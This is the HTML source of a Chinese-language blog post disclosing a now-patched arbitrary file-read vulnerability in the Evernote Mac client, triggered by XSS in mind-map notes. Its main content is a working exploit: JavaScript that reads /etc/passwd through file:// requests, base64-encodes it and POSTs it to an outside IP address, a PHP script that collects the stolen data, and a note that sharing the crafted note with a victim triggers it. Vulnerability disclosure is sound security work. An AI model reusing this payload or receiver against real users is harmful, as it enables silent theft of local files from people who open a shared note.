@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="Zh/Cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="影响版本9.2.4和Windows的版本6.19.21Beta之前带有思维导图的都可以触发。已经在9.2.4和Windows的版本6.19.21Beta进行了修复。 原理本质就是一个xss，和之前印象笔记rce一样，但是由于mac没得用jsonp，win上jsonp执行代码的方式都禁掉了，只能从本身支持的函数上找，找的太麻烦了，就交了。mac上是file域，所以可以进行文件读取，从而造成任意文件读">
+<meta property="og:type" content="article">
+<meta property="og:title" content="印象笔记Mac版远程任意文件读取漏洞">
+<meta property="og:url" content="http://yangge.me/2020/01/05/印象笔记Mac版远程任意文件读取漏洞/index.html">
+<meta property="og:site_name">
+<meta property="og:description" content="影响版本9.2.4和Windows的版本6.19.21Beta之前带有思维导图的都可以触发。已经在9.2.4和Windows的版本6.19.21Beta进行了修复。 原理本质就是一个xss，和之前印象笔记rce一样，但是由于mac没得用jsonp，win上jsonp执行代码的方式都禁掉了，只能从本身支持的函数上找，找的太麻烦了，就交了。mac上是file域，所以可以进行文件读取，从而造成任意文件读">
+<meta property="og:locale" content="Zh/Cn">
+<meta property="og:image" content="https://i.loli.net/2020/01/06/5k3V6wfEj7Outg1.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/06/JpidR3VtgvoBhwa.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/06/sGiXmKckbTeo64D.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/01/06/IiJOVuyvEzQj2Z4.jpg">
+<meta property="og:updated_time" content="2020-01-06T03:57:03.061Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="印象笔记Mac版远程任意文件读取漏洞">
+<meta name="twitter:description" content="影响版本9.2.4和Windows的版本6.19.21Beta之前带有思维导图的都可以触发。已经在9.2.4和Windows的版本6.19.21Beta进行了修复。 原理本质就是一个xss，和之前印象笔记rce一样，但是由于mac没得用jsonp，win上jsonp执行代码的方式都禁掉了，只能从本身支持的函数上找，找的太麻烦了，就交了。mac上是file域，所以可以进行文件读取，从而造成任意文件读">
+<meta name="twitter:image" content="https://i.loli.net/2020/01/06/5k3V6wfEj7Outg1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yangge.me/2020/01/05/印象笔记Mac版远程任意文件读取漏洞/"/>
+
+
+
+
+
+  <title>印象笔记Mac版远程任意文件读取漏洞 | </title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Zh/Cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title"></span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2020/01/05/印象笔记Mac版远程任意文件读取漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yangge">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">印象笔记Mac版远程任意文件读取漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-01-05T21:29:39+08:00">
+                2020-01-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/01/05/印象笔记Mac版远程任意文件读取漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/01/05/印象笔记Mac版远程任意文件读取漏洞/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>9.2.4和Windows的版本6.19.21Beta之前带有思维导图的都可以触发。<br>已经在9.2.4和Windows的版本6.19.21Beta进行了修复。<br><img src="https://i.loli.net/2020/01/06/5k3V6wfEj7Outg1.jpg" alt="Xnip2020-01-06_11-54-33.jpg"></p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>本质就是一个xss，和之前印象笔记rce一样，但是由于mac没得用jsonp，win上jsonp执行代码的方式都禁掉了，只能从本身支持的函数上找，找的太麻烦了，就交了。<br>mac上是file域，所以可以进行文件读取，从而造成任意文件读取，win上不行。</p>
+<h4 id="xss点："><a href="#xss点：" class="headerlink" title="xss点："></a>xss点：</h4><p>xss点比较难找，添加思维导图的时候插入带头xss头的笔记就可以触发。<br><img src="https://i.loli.net/2020/01/06/JpidR3VtgvoBhwa.jpg" width="50%"><br>可以看到已经成功触发<br><img src="https://i.loli.net/2020/01/06/sGiXmKckbTeo64D.jpg" width="50%"></p>
+<h3 id="远程任意文件读取"><a href="#远程任意文件读取" class="headerlink" title="远程任意文件读取"></a>远程任意文件读取</h3><p>调用远程js文件，js文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(function() &#123;</span><br><span class="line">    var BASE64_MAPPING = [&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;, &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;, &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;, &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apos;z&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;+&apos;, &apos;/&apos;];</span><br><span class="line">    var _toBinary = function(ascii) &#123;</span><br><span class="line">            var binary = new Array();</span><br><span class="line">            while (ascii &gt; 0) &#123;</span><br><span class="line">                var b = ascii % 2;</span><br><span class="line">                ascii = Math.floor(ascii / 2);</span><br><span class="line">                binary.push(b);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            binary.reverse();</span><br><span class="line">            return binary;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    var _toDecimal = function(binary) &#123;</span><br><span class="line">            var dec = 0;</span><br><span class="line">            var p = 0;</span><br><span class="line">            for (var i = binary.length - 1; i &gt;= 0; --i) &#123;</span><br><span class="line">                var b = binary[i];</span><br><span class="line">                if (b == 1) &#123;</span><br><span class="line">                    dec += Math.pow(2, p);</span><br><span class="line">                &#125;++p;</span><br><span class="line">            &#125;</span><br><span class="line">            return dec;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    var _toUTF8Binary = function(c, binaryArray) &#123;</span><br><span class="line">            var mustLen = (8 - (c + 1)) + ((c - 1) * 6);</span><br><span class="line">            var fatLen = binaryArray.length;</span><br><span class="line">            var diff = mustLen - fatLen;</span><br><span class="line">            while (--diff &gt;= 0) &#123;</span><br><span class="line">                binaryArray.unshift(0);</span><br><span class="line">            &#125;</span><br><span class="line">            var binary = [];</span><br><span class="line">            var _c = c;</span><br><span class="line">            while (--_c &gt;= 0) &#123;</span><br><span class="line">                binary.push(1);</span><br><span class="line">            &#125;</span><br><span class="line">            binary.push(0);</span><br><span class="line">            var i = 0,</span><br><span class="line">                len = 8 - (c + 1);</span><br><span class="line">            for (; i &lt; len; ++i) &#123;</span><br><span class="line">                binary.push(binaryArray[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (var j = 0; j &lt; c - 1; ++j) &#123;</span><br><span class="line">                binary.push(1);</span><br><span class="line">                binary.push(0);</span><br><span class="line">                var sum = 6;</span><br><span class="line">                while (--sum &gt;= 0) &#123;</span><br><span class="line">                    binary.push(binaryArray[i++]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return binary;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    var __BASE64 = &#123;</span><br><span class="line">        encoder: function(str) &#123;</span><br><span class="line">            var base64_Index = [];</span><br><span class="line">            var binaryArray = [];</span><br><span class="line">            for (var i = 0, len = str.length; i &lt; len; ++i) &#123;</span><br><span class="line">                var unicode = str.charCodeAt(i);</span><br><span class="line">                var _tmpBinary = _toBinary(unicode);</span><br><span class="line">                if (unicode &lt; 0x80) &#123;</span><br><span class="line">                    var _tmpdiff = 8 - _tmpBinary.length;</span><br><span class="line">                    while (--_tmpdiff &gt;= 0) &#123;</span><br><span class="line">                        _tmpBinary.unshift(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                    binaryArray = binaryArray.concat(_tmpBinary);</span><br><span class="line">                &#125; else if (unicode &gt;= 0x80 &amp;&amp; unicode &lt;= 0x7FF) &#123;</span><br><span class="line">                    binaryArray = binaryArray.concat(_toUTF8Binary(2, _tmpBinary));</span><br><span class="line">                &#125; else if (unicode &gt;= 0x800 &amp;&amp; unicode &lt;= 0xFFFF) &#123; //UTF-8 3byte</span><br><span class="line">                    binaryArray = binaryArray.concat(_toUTF8Binary(3, _tmpBinary));</span><br><span class="line">                &#125; else if (unicode &gt;= 0x10000 &amp;&amp; unicode &lt;= 0x1FFFFF) &#123; //UTF-8 4byte</span><br><span class="line">                    binaryArray = binaryArray.concat(_toUTF8Binary(4, _tmpBinary));</span><br><span class="line">                &#125; else if (unicode &gt;= 0x200000 &amp;&amp; unicode &lt;= 0x3FFFFFF) &#123; //UTF-8 5byte</span><br><span class="line">                    binaryArray = binaryArray.concat(_toUTF8Binary(5, _tmpBinary));</span><br><span class="line">                &#125; else if (unicode &gt;= 4000000 &amp;&amp; unicode &lt;= 0x7FFFFFFF) &#123; //UTF-8 6byte</span><br><span class="line">                    binaryArray = binaryArray.concat(_toUTF8Binary(6, _tmpBinary));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var extra_Zero_Count = 0;</span><br><span class="line">            for (var i = 0, len = binaryArray.length; i &lt; len; i += 6) &#123;</span><br><span class="line">                var diff = (i + 6) - len;</span><br><span class="line">                if (diff == 2) &#123;</span><br><span class="line">                    extra_Zero_Count = 2;</span><br><span class="line">                &#125; else if (diff == 4) &#123;</span><br><span class="line">                    extra_Zero_Count = 4;</span><br><span class="line">                &#125;</span><br><span class="line">                var _tmpExtra_Zero_Count = extra_Zero_Count;</span><br><span class="line">                while (--_tmpExtra_Zero_Count &gt;= 0) &#123;</span><br><span class="line">                    binaryArray.push(0);</span><br><span class="line">                &#125;</span><br><span class="line">                base64_Index.push(_toDecimal(binaryArray.slice(i, i + 6)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var base64 = &apos;&apos;;</span><br><span class="line">            for (var i = 0, len = base64_Index.length; i &lt; len; ++i) &#123;</span><br><span class="line">                base64 += BASE64_MAPPING[base64_Index[i]];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (var i = 0, len = extra_Zero_Count / 2; i &lt; len; ++i) &#123;</span><br><span class="line">                base64 += &apos;=&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            return base64;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    window.BASE64 = __BASE64;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function sendGetRequest(url) &#123;</span><br><span class="line">    var xhr = new XMLHttpRequest();</span><br><span class="line">    var xhr1 = new XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = function()&#123;</span><br><span class="line">        if(xhr.readyState == XMLHttpRequest.DONE)&#123;</span><br><span class="line">            var text = BASE64.encoder(xhr.responseText);</span><br><span class="line">            xhr1.open(&apos;POST&apos;,&apos;http://106.54.164.22:81/test.php&apos;,false);</span><br><span class="line">            xhr1.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">            xhr1.send(&apos;file=&apos;+text);</span><br><span class="line">             </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    xhr.open(&apos;GET&apos;, &apos;file:///etc/passwd&apos;);</span><br><span class="line">    xhr.send()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendGetRequest(&apos;file:///etc/passwd&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>test.php 内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $data = base64_decode($_POST[&quot;file&quot;]);</span><br><span class="line">    $file = fopen(&quot;file.txt&quot;,&apos;a&apos;);</span><br><span class="line">        fwrite($file,$data);</span><br><span class="line">        fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>接受到请求，写到file.txt中<br><img src="https://i.loli.net/2020/01/06/IiJOVuyvEzQj2Z4.jpg" width="50%"></p>
+<h4 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h4><p>很简单，编辑好攻击笔记直接利用共享的方式发送给别人，只要在客户端中打开就能触发。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/15/Untitled/" rel="next" title="键盘记录器demo">
+                <i class="fa fa-chevron-left"></i> 键盘记录器demo
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/01/29/5a6ec351ca6e7.jpg"
+                alt="yangge" />
+            
+              <p class="site-author-name" itemprop="name">yangge</p>
+              <p class="site-description motion-element" itemprop="description">一束光照进了铁塔，塔里的肮脏龌龊被显现，这束光便有了罪。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yang8e/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:470818631@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-qq"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响版本"><span class="nav-number">1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss点："><span class="nav-number">3.</span> <span class="nav-text">xss点：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#远程任意文件读取"><span class="nav-number"></span> <span class="nav-text">远程任意文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#远程利用"><span class="nav-number">1.</span> <span class="nav-text">远程利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yangge</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://yangge.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yangge.me/2020/01/05/印象笔记Mac版远程任意文件读取漏洞/';
+          this.page.identifier = '2020/01/05/印象笔记Mac版远程任意文件读取漏洞/';
+          this.page.title = '印象笔记Mac版远程任意文件读取漏洞';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://yangge.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
